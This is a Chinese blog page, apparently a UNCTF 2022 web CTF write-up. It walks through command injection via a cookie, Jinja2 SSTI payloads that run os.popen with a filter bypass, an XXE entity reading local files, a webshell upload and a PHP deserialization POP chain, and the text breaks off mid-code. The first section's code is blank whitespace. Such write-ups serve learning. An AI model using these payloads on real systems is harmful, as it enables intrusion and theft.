@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-32x32.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/favicon-32x32.ico" color="#222">
+  <meta name="baidu-site-verification" content="http://data.zz.baidu.com/urls?site=https://blog.sechelper.com&token=CxiR0obbVQeqayMP">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.sechelper.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"remove","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="作者：凉拌_@助安社区 ¶题目：ezunseri  题目提示是反序列化类型的题，进入后直接给出了题目源代码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UNCTF-web 大学生竞赛解析（一）">
+<meta property="og:url" content="https://blog.sechelper.com/20221118/ctf/unctf-web/index.html">
+<meta property="og:site_name" content="助安社区 - 极度开放的网络安全自学社区">
+<meta property="og:description" content="作者：凉拌_@助安社区 ¶题目：ezunseri  题目提示是反序列化类型的题，进入后直接给出了题目源代码">
+<meta property="og:locale">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/7ad121851d9dc133a327ddab76be2424.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/cd688c96e38c7908773ea77992a218de.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/9b74f62bc5bb8de5e15065c5452969dc.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/283c522b813ae81632f63b93595a488d.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/f496303d0b6f5eefb2446175c2f13298.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/864d1d28c2473fb7ee3522cc88adc64e.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/e1a04e1a201bceb47203ea7d14a18398.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/61f01c5dcf2cffafee5cad37caa27d6e.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/76b09132585c831d55658cc6e90f700c.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/8f7a84e8e1197b31bb3bc8c7b65524c5.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/796b3e235e8bfe64d4fb745d1bec099d.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/0cfec6cb41086fdf984e231b0e2645f5.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/da02e88ce52e5c4d46bffcf5b8aeb2af.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/a17340f13a9d7e6d57b9686d6bc01a23.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/553f97df13b49b83eaa7665505a42e46.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/2814810ea80893421f5d38ae913b120a.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/a0f0bfe2ed9ba24bc53d4873fa723ccd.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/4f9c82892cb6fd70153ff1f451a0e24b.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/b399c3b7779e229330e293d7815d10d7.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/5c18b00871ac439441ee1d235b03dbd4.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/cf72077433890d68320fdc349d1a8f28.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/ae5effc16262d9b0a79434292f55e38d.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/571df71076003136e3529e4bb63c17a7.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/d4760cfcf99762f6799b902d75e0789f.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/cda4a6205716e9134d3521b76bdc0e8e.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/b80481555568322fa05ce02ecffcb4bb.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/e6f608862223bd72de40990c229bd128.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/9c7bca5cb0205ab3d3b53fb416e34ad3.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/a6b2dfa6516af1ea179883e8bd039e13.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/dceaf1acb8c8c99dee66dedc0e00064a.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/44b7dac6deeb0854aa1acd9a3e3a4178.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/cc5040aaa4fbc9223abf361f7269db1f.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/c7a0fd1692a9eeeb11a84262a0ebee79.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/18/f812472f37b0ff03f686b24bd98478d8.png">
+<meta property="article:published_time" content="2022-11-18T03:06:00.000Z">
+<meta property="article:modified_time" content="2023-03-27T01:44:43.258Z">
+<meta property="article:author" content="狗头君师">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="大学生竞赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://static.sechelper.com/img/2022/11/18/7ad121851d9dc133a327ddab76be2424.png">
+
+<link rel="canonical" href="https://blog.sechelper.com/20221118/ctf/unctf-web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'cn'
+  };
+</script>
+
+  <title>UNCTF-web 大学生竞赛解析（一） | 助安社区 - 极度开放的网络安全自学社区</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">助安社区 - 极度开放的网络安全自学社区</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">关注公众号【助安社区】，订阅最优质网络安全学习知识</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section">主页</a>
+
+  </li>
+        <li class="menu-item menu-item-加入社区">
+
+    <a href="/join-us/" rel="section">加入社区</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section">关于</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section">标签</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section">分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section">归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+   <style type="text/css">
+  .qrcode-nav {
+	bottom: 40%;
+	box-sizing: border-box;
+	color: #000;
+	cursor: pointer;
+	opacity: 1;
+	padding: 0 6px;
+	position: fixed;
+	transition-property: bottom;
+	z-index: 1300;
+	width: initial;
+	margin-left: 80%;
+	high: 200;
+	width: 200px;
+}  
+   </style>
+  <div id="qrcode-nav" class="qrcode-nav">
+  <center><img src="https://static.sechelper.com/img/qrcode/blog-kun.png"><span><strong>加入社区</strong></span></center>
+  </div>
+<script>
+if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
+document.getElementById("qrcode-nav").hidden=true
+}
+</script>
+
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20221118/ctf/unctf-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="狗头君师">
+      <meta itemprop="description" content="技术烂大街，经验诚可贵">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="助安社区 - 极度开放的网络安全自学社区">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          UNCTF-web 大学生竞赛解析（一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-11-18 11:06:00" itemprop="dateCreated datePublished" datetime="2022-11-18T11:06:00+08:00">2022-11-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-27 09:44:43" itemprop="dateModified" datetime="2023-03-27T09:44:43+08:00">2023-03-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>作者：凉拌_@助安社区</strong></p>
+<h2 id="题目：ezunseri"><a class="header-anchor" href="#题目：ezunseri">¶</a>题目：ezunseri</h2>
+<p><img src="https://static.sechelper.com/img/2022/11/18/7ad121851d9dc133a327ddab76be2424.png" alt="image-20221118102448053"></p>
+<p>题目提示是反序列化类型的题，进入后直接给出了题目源代码</p>
+<span id="more"></span>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功上传一句话马，使用webshell管理用具连接，寻找flag</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/cd688c96e38c7908773ea77992a218de.png" alt="image-20221118104522051"></p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/9b74f62bc5bb8de5e15065c5452969dc.png" alt="image-20221118104531701"></p>
+<p>在home下ctf文件里</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;3fd041c7-475c-4114-95d5-73b94d345a48&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="题目：我太喜欢bilibili大学啦修复版"><a class="header-anchor" href="#题目：我太喜欢bilibili大学啦修复版">¶</a>题目：我太喜欢bilibili大学啦修复版</h2>
+<p><img src="https://static.sechelper.com/img/2022/11/18/283c522b813ae81632f63b93595a488d.png" alt="image-20221118104807783"></p>
+<p>题目提示有2个hint，打开容器发现是php详情界面</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/f496303d0b6f5eefb2446175c2f13298.png" alt="image-20221118104821521"></p>
+<p>搜索flag发现是假的，根据题目提示hint，搜索下hint发现</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/864d1d28c2473fb7ee3522cc88adc64e.png" alt="image-20221118104828193"></p>
+<p>是一串编码猜测为base64编码(web题的编码一般为base64，关于编码的详细介绍会在后面中misc里有介绍)，解码后提示admin_unctf.php页面</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/e1a04e1a201bceb47203ea7d14a18398.png" alt="image-20221118104842177"></p>
+<p>访问admin_unctf.php页面发现是一个登录页面，源代码显示有提示</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/61f01c5dcf2cffafee5cad37caa27d6e.png" alt="image-20221118104852471"></p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/76b09132585c831d55658cc6e90f700c.png" alt="image-20221118104936309"></p>
+<p>我们先随意输入登录测试一下，会显示用户或密码错误</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/8f7a84e8e1197b31bb3bc8c7b65524c5.png" alt="image-20221118104958886"></p>
+<p>先不急着测试注入相关，先根据提示所说抓个包看一下，抓admin_unctf.php页面的响应包</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/796b3e235e8bfe64d4fb745d1bec099d.png" alt="image-20221118105011426"></p>
+<p>发现有hint提示，同样是一串编码，一般编码最后有=号的大概率是base64编码，解密一下</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/0cfec6cb41086fdf984e231b0e2645f5.png" alt="image-20221118105026584"></p>
+<p>发现是2部分字符 unctf2022 猜测是用户名和密码，登录进去后显示</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/da02e88ce52e5c4d46bffcf5b8aeb2af.png" alt="image-20221118105039251"></p>
+<p>前面是一些判断已经进来了不重要，主要看system语句，可以用它来执行linux命令，传入的参数是ping和$_COOKIE拼接语句，这涉及到命令执行漏洞。</p>
+<p>在linux系统中 | 叫管带操作符，用来连接命令的，例：A|B 意思是无论A命令是否执行正确,B命令都会执行</p>
+<p>通过 | 管道符我们可以绕过前面的ping命令达到任意命令执行</p>
+<p>而$_COOKIE变量获取的是请求包的cookie值</p>
+<p>我们抓个包查看一下，发现原始请求包是没有cookie键的需要我们手动添加</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/a17340f13a9d7e6d57b9686d6bc01a23.png" alt="img"></p>
+<p>在php中cookie的键值对类似是：Cookie: xxx=xxx</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/553f97df13b49b83eaa7665505a42e46.png" alt="img"></p>
+<p>返回了一串编码，猜测为base64（web题编码一般为base64）</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/2814810ea80893421f5d38ae913b120a.png" alt="img"></p>
+<p>解码出来是b站的用户地址访问拿到flag</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/a0f0bfe2ed9ba24bc53d4873fa723ccd.png" alt="img"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;this_is_so_easy&#125; </span><br></pre></td></tr></table></figure>
+<h2 id="题目：easy-ssti"><a class="header-anchor" href="#题目：easy-ssti">¶</a>题目：easy ssti</h2>
+<p><img src="https://static.sechelper.com/img/2022/11/18/4f9c82892cb6fd70153ff1f451a0e24b.png" alt="img"></p>
+<p>审题：题目显示是ssti服务器端模板注入，提示是python的模板注入</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/b399c3b7779e229330e293d7815d10d7.png" alt="img"></p>
+<p>登录页面，随意输入发现成功登录。发现会把我们输入的用户名显示出来，那么大概率这里就是注入点</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/5c18b00871ac439441ee1d235b03dbd4.png" alt="img"></p>
+<p>测试ssti注入方法：</p>
+<p>输入49，返回49表示是 Twig 模块</p>
+<p>输入49，返回7777777表示是 Jinja2 模块</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/cf72077433890d68320fdc349d1a8f28.png" alt="img"><img src="https://static.sechelper.com/img/2022/11/18/ae5effc16262d9b0a79434292f55e38d.png" alt="img"></p>
+<p>发现返回7777777那么就是Jinja2 模块注入</p>
+<p>关于模板注入的详情就不详细介绍了因为很多了，这里给出4种payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;typeflag.txt&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[80].__init__.__globals__[&#x27;__builtins__&#x27;].open(&quot;flag.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">&#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">&#123;% if &#x27;eval&#x27; in b.keys() %&#125;</span><br><span class="line">&#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;type flag.txt&quot;).read()&#x27;) &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;type flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>如果关键字被过滤可以使用[‘’+‘’]方式绕过。例：[‘<strong>cl’+'ass</strong>’]</p>
+<p>这里我们使用第4种payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;type flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://static.sechelper.com/img/2022/11/18/571df71076003136e3529e4bb63c17a7.png" alt="img"></p>
+<p>提示我们class被检测了，我们使用[‘’+‘’]方法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://static.sechelper.com/img/2022/11/18/d4760cfcf99762f6799b902d75e0789f.png" alt="img"></p>
+<p>成功注入，接下来就是找寻flag，这里有个坑，因为flag并没在显眼的文件里，在linux的环境变量里，用printenv打印所有变量显示出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[&#x27;__cl&#x27;+&#x27;ass__&#x27;][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;printenv&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://static.sechelper.com/img/2022/11/18/cda4a6205716e9134d3521b76bdc0e8e.png" alt="img"></p>
+<p>一般我们在注入成功后寻找flag，在网站目录里和根目录下没有flag相关的文件，那么就要考虑一下是否在其他位置比如环境变量</p>
+<h2 id="题目：听说php有一个xxe"><a class="header-anchor" href="#题目：听说php有一个xxe">¶</a>题目：听说php有一个xxe</h2>
+<p><img src="https://static.sechelper.com/img/2022/11/18/b80481555568322fa05ce02ecffcb4bb.png" alt="img"></p>
+<p>题目提示为xxe为XML实体注入漏洞</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/e6f608862223bd72de40990c229bd128.png" alt="img"></p>
+<p>打开题目提示有hint，访问hint获取一个文件，使用记事本打开</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/9c7bca5cb0205ab3d3b53fb416e34ad3.png" alt="img"></p>
+<p>提示为dom.php页面，访问XML报错是空字符串，和一些xml的配置信息</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/a6b2dfa6516af1ea179883e8bd039e13.png" alt="img"></p>
+<p>使用hackbar随便传个post包在进行抓包</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/dceaf1acb8c8c99dee66dedc0e00064a.png" alt="img"></p>
+<p>改一下包随便传入一个xml格式的xxe注入payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span>//XML声明</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>//DTD部分这里的note其实是一个代号吧可以改，这是使用system命令</span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span>//XML部分，一开始就有的</span><br></pre></td></tr></table></figure>
+<p><img src="https://static.sechelper.com/img/2022/11/18/44b7dac6deeb0854aa1acd9a3e3a4178.png" alt="img"></p>
+<p>报错显示XML声明只能在开头，我们把payload的声明去掉再传入</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/cc5040aaa4fbc9223abf361f7269db1f.png" alt="img"></p>
+<p>发现flag就出现了</p>
+<h2 id="题目：poppop"><a class="header-anchor" href="#题目：poppop">¶</a>题目：poppop</h2>
+<p><img src="https://static.sechelper.com/img/2022/11/18/c7a0fd1692a9eeeb11a84262a0ebee79.png" alt="img"></p>
+<p>根据题目提示应该也是反序列化构造pop链</p>
+<p>打开发现是ubuntu的默认页面，查询一些常见网页名(后面会在其他文章有详细介绍web做题流程常见思路)访问一下index.php</p>
+<p><img src="https://static.sechelper.com/img/2022/11/18/f812472f37b0ff03f686b24bd98478d8.png" alt="img"></p>
+<p>发现出现了题目，根据php反序列化流程走一遍，这里介绍相关函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$key2</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;key2-&gt;<span class="title function_ invoke__">abab</span>();</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;poc&#x27;</span>]);</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  